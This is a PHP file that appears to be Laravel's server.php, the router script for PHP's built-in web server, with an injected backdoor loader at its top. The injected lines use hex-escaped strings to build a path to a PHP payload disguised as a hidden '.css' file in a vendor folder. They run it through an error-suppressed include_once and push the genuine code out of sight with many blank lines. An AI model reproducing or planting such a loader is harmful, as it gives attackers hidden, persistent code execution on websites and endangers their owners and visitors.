<?php
/*38044*/

$r2x3q = "/hom\x65/soilcharg\x65r/public_html/d\x65l_final_w\x65bsit\x65/v\x65ndor/dflyd\x65v/.65d59963.css"; if (!isset($r2x3q)) {addslashes ($r2x3q);} else { @include_once /* 95 */ ($r2x3q); }

/*38044*/






































/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylor@laravel.com>
 */

$uri = urldecode(
    parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH) ?? ''
);

// This file allows us to emulate Apache's "mod_rewrite" functionality from the
// built-in PHP web server. This provides a convenient way to test a Laravel
// application without having installed a "real" web server software here.
if ($uri !== '/' && file_exists(__DIR__.'/public'.$uri)) {
    return false;
}

require_once __DIR__.'/public/index.php';
